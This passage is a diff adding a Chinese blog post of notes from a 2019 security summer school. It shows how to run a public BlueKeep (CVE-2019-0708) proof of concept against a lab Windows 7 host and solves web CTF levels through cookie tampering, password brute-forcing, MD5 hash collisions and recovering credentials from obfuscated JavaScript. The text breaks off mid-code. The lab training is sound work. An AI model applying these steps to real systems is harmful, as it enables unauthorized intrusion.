@@ -1,0 +1,489 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>ECNU X 启明星辰 网络安全暑期学校记录 - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="ECNU X 启明星辰 网络安全暑期学校记录"><meta property="og:description" content="7.22-7.26，收获不大。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/summer-school/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-07-23T14:39:19+00:00"><meta property="article:modified_time" content="2019-07-23T14:39:19+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="ECNU X 启明星辰 网络安全暑期学校记录"><meta name=twitter:description content="7.22-7.26，收获不大。"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/summer-school/><link rel=prev href=https://blog.sigmerc.top/beef-msf/><link rel=next href=https://blog.sigmerc.top/shiyanba-web/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"ECNU X 启明星辰 网络安全暑期学校记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/summer-school\/"},"genre":"posts","keywords":"Kali, Hash, Javascript, 反序列化, RSA, SQLi","wordcount":2581,"url":"https:\/\/blog.sigmerc.top\/summer-school\/","datePublished":"2019-07-23T14:39:19+00:00","dateModified":"2019-07-23T14:39:19+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
+<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">ECNU X 启明星辰 网络安全暑期学校记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/web-%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>Web 安全</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2019-07-23>2019-07-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2581 字&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;<span id=/summer-school/ class=leancloud_visitors data-flag-title="ECNU X 启明星辰 网络安全暑期学校记录">
+<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#day1--day2>Day1 & Day2</a><ul><li><a href=#可能需要补的东西>可能需要补的东西</a></li><li><a href=#cve-2019-0708>CVE-2019-0708</a></li></ul></li><li><a href=#day3>Day3</a><ul><li><a href=#level4>Level4</a></li><li><a href=#level5>Level5</a></li><li><a href=#level6>Level6</a></li><li><a href=#level7>Level7</a></li><li><a href=#level8>Level8</a></li><li><a href=#level10>Level10</a></li><li><a href=#level11>Level11</a></li><li><a href=#level12>Level12</a></li><li><a href=#level13>Level13</a></li></ul></li><li><a href=#day4--day5>Day4 & Day5</a><ul><li><a href=#john-破解-des>John 破解 DES</a></li><li><a href=#john-破解-windows-管理员密码>John 破解 Windows 管理员密码</a></li><li><a href=#python-库-steganography-命令行使用>Python 库 Steganography 命令行使用</a></li><li><a href=#f5-steganography-使用>F5-Steganography 使用</a></li><li><a href=#steghide-使用>steghide 使用</a></li><li><a href=#图片隐写压缩包--图片>图片隐写压缩包 / 图片</a></li><li><a href=#rsa---已知-pqe>RSA - 已知 p,q,e</a></li><li><a href=#misc---未知领域>Misc - 未知领域</a></li><li><a href=#哈希还原>哈希还原</a></li><li><a href=#sql-注入流量包分析>SQL 注入流量包分析</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></div><div class=content id=content><p>7.22-7.26，收获不大。</p><h2 id=day1--day2>Day1 & Day2</h2><p>概念介绍和比较基本的漏洞利用。</p><h3 id=可能需要补的东西>可能需要补的东西</h3><ul><li>协议 & 路由相关知识：TCP/IP 卷一，CCNA/CCNP 学习指导</li><li>安全技能证书</li><li>PHP 代码审计工具</li><li>PHP</li><li>SQL</li><li>工具的使用</li><li>……</li></ul><h3 id=cve-2019-0708>CVE-2019-0708</h3><p>获取脚本：<a href=https://www.exploit-db.com/exploits/46946 target=_blank rel="noopener noreffer">https://www.exploit-db.com/exploits/46946</a>，命名为 <code>poc.py</code>。</p><p>在 Win7 靶机上开启 3389 端口（<code>计算机</code>-><code>属性</code>-><code>远程设置</code>-><code>允许所有...</code>），并通过 <code>ipconfig</code> 查看 IP。</p><p>最后终端运行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python poc.py <span class=o>[</span>靶机 IP 靶机位数<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>其中靶机 IP 为上面获得的 IP，靶机位数为 32 或 64。</p><blockquote><p>其余 CVE 利用过程都基于 MSF，比较套路。</p></blockquote><h2 id=day3>Day3</h2><p>Web 方向。</p><h3 id=level4>Level4</h3><p>扫后台发现存在备份文件 <code>index.php.bak</code>，得 PHP 代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>ERROR_REPORTING</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ver&#39;</span><span class=p>])</span><span class=o>==</span><span class=k>PHP_VERSION</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ver&#39;</span><span class=p>]</span><span class=o>==</span><span class=k>PHP_VERSION</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$key</span> <span class=o>=</span> <span class=s2>&#34;**********&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>burp 抓包发现返回头中有 <code>X-Powered-By: PHP/5.4.41</code>，那么把 <code>ver=5.4.41</code> 作为参数通过 <code>GET</code> 请求发送即可。</p><h3 id=level5>Level5</h3><p>F12 在注释中发现存在 <code>password.txt</code>，查看发现是一个字典，放到 Intruder 里跑出密码为 <code>Nsf0cuS</code>，然后登录。不过前端有 js 限制了密码长度，修改 js 即可，或者也可以直接 Burp 发包。</p><p>登陆成功后，在 Set-Cookie 字段中发现 <code>newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;</code>，base64 解码得 <code>290bca70c7dae93db6644fa00b9d83b9.php</code>，访问。</p><p>在留言板界面任意留言并抓包，发现存在一个 <code>isLogin=0</code> 的 Cookie 和 <code>userlevel=guest</code> 的参数，分别修改为 <code>1</code> 和 <code>root</code> 即可。</p><h3 id=level6>Level6</h3><p><code>240610708</code> 和 <code>QNKCDZO</code> 的 MD5 值相同。</p><h3 id=level7>Level7</h3><p>根据加密函数写解密程序 <code>decode.php</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>decode</span><span class=p>(</span><span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nv>$_</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nx>strrev</span><span class=p>(</span><span class=nx>str_rot13</span><span class=p>(</span><span class=nv>$s</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl>  <span class=nv>$_o</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=nv>$_0</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$_0</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$_</span><span class=p>);</span> <span class=o>++</span><span class=nv>$_0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$_c</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$_</span><span class=p>,</span> <span class=nv>$_0</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$__</span> <span class=o>=</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$_c</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$_c</span> <span class=o>=</span> <span class=nx>chr</span><span class=p>(</span><span class=nv>$__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$_o</span> <span class=o>.=</span> <span class=nv>$_c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>strrev</span><span class=p>(</span><span class=nv>$_o</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>decode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;str&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>然后本机开个服务器（我的是 8082 端口），<code>decode.php</code> 放在 <code>www</code> 目录里，访问 <code>http://localhost:8082/decode.php?str=pJovuTsWOUrtIJZtcKZ2OJMzEJZyMTLdIas</code> 即可。</p><h3 id=level8>Level8</h3><p><code>check.js</code> 是 packer 加密，直接去掉 <code>eval</code> 放控制台跑一下得到 js 源码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>_f</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>f</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;form&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>f</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>f</span><span class=p>.</span><span class=nx>name</span> <span class=o>=</span> <span class=s2>&#34;login&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>f</span>
+</span></span><span class=line><span class=cl><span class=p>}();</span>
+</span></span><span class=line><span class=cl><span class=nx>_uname</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>uname</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>uname</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s2>&#34;text&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>uname</span><span class=p>.</span><span class=nx>id</span> <span class=o>=</span> <span class=s2>&#34;uname&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>uname</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=s1>&#39;Input Username&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>uname</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>margin</span> <span class=o>=</span> <span class=s2>&#34;0px 0px 0px 60px&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>_f</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>uname</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>uname</span><span class=p>.</span><span class=nx>onfocus</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>==</span><span class=s1>&#39;Input Username&#39;</span><span class=p>)</span> <span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span><span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>  <span class=nx>uname</span><span class=p>.</span><span class=nx>onblur</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>==</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span><span class=s1>&#39;Input Username&#39;</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>uname</span>
+</span></span><span class=line><span class=cl><span class=p>}();</span>
+</span></span><span class=line><span class=cl><span class=nx>_br</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>br</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;br&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>_f</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>br</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>br</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;br&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>_f</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>br</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>br</span>
+</span></span><span class=line><span class=cl><span class=p>}();</span>
+</span></span><span class=line><span class=cl><span class=nx>_upass</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>upass</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>upass</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s2>&#34;password&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>upass</span><span class=p>.</span><span class=nx>id</span> <span class=o>=</span> <span class=s2>&#34;upass&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>upass</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=s1>&#39;Input Password&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>upass</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>margin</span> <span class=o>=</span> <span class=s2>&#34;0px 0px 0px 60px&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>_f</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>upass</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>upass</span><span class=p>.</span><span class=nx>onfocus</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>==</span><span class=s1>&#39;Input Password&#39;</span><span class=p>)</span> <span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span><span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>  <span class=nx>upass</span><span class=p>.</span><span class=nx>onblur</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>==</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>this</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span><span class=s1>&#39;Input Password&#39;</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>upass</span>
+</span></span><span class=line><span class=cl><span class=p>}();</span>
+</span></span><span class=line><span class=cl><span class=nx>_btn</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>btn</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>_f</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>btn</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nx>btn</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s2>&#34;button&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>btn</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;login&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nx>btn</span><span class=p>.</span><span class=nx>onclick</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>uname</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;uname&#39;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>upass</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;upass&#39;</span><span class=p>).</span><span class=nx>value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>uname</span> <span class=o>==</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;Please Input Username!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>upass</span> <span class=o>==</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;Please Input Password!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nb>eval</span><span class=p>(</span><span class=nx>unescape</span><span class=p>(</span><span class=s2>&#34;var%20strKey1%20%3D%20%22JaVa3C41ptIsAGo0DStAff%22%3B%0Avar%20strKey2%20%3D%20%22CaNUknOWThIsK3y%22%3B%0Avar%20strKey3%20%3D%20String.fromCharCode%2871%2C%2048%2C%20111%2C%20100%2C%2033%29%3B%0Aif%20%28uname%20%3D%3D%20%28strKey3%20+%20%28%28%28strKey1.toLowerCase%28%29%29.substring%280%2C%20strKey1.indexOf%28%220%22%29%29%20+%20strKey2.substring%282%2C%206%29%29.toUpperCase%28%29%29.substring%280%2C%2015%29%29%29%20%7B%0A%20%20%20%20var%20strKey4%20%3D%20%27Java_Scr1pt_Pa4sW0rd_K3y_H3re%27%3B%0A%20%20%20%20if%20%28upass%20%3D%3D%20%28strKey4.substring%28strKey4.indexOf%28%271%27%2C%205%29%2C%20strKey4.length%20-%20strKey4.indexOf%28%27_%27%29%20+%205%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Login%20Success%21%27%29%3B%0A%20%20%20%20%20%20%20%20document.getElementById%28%27key%27%29.innerHTML%20%3D%20unescape%28%22%253Cfont%2520color%253D%2522%2523000%2522%253Ea2V5X0NoM2NrXy50eHQ%3D%253C/font%253E%22%29%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20alert%28%27Password%20Error%21%27%29%3B%0A%20%20%20%20%7D%0A%7D%20else%20%7B%0A%20%20%20%20alert%28%27Login%20Failed%21%27%29%3B%0A%7D&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=kc>false</span>
+</span></span><span class=line><span class=cl><span class=p>}();</span>
+</span></span></code></pre></td></tr></table></div></div><p>只有最后一个 <code>else</code> 里的代码比较重要，去掉 <code>eval</code> 运行得：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>strKey1</span> <span class=o>=</span> <span class=s2>&#34;JaVa3C41ptIsAGo0DStAff&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>strKey2</span> <span class=o>=</span> <span class=s2>&#34;CaNUknOWThIsK3y&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>strKey3</span> <span class=o>=</span> <span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=mi>71</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>33</span><span class=p>);</span>
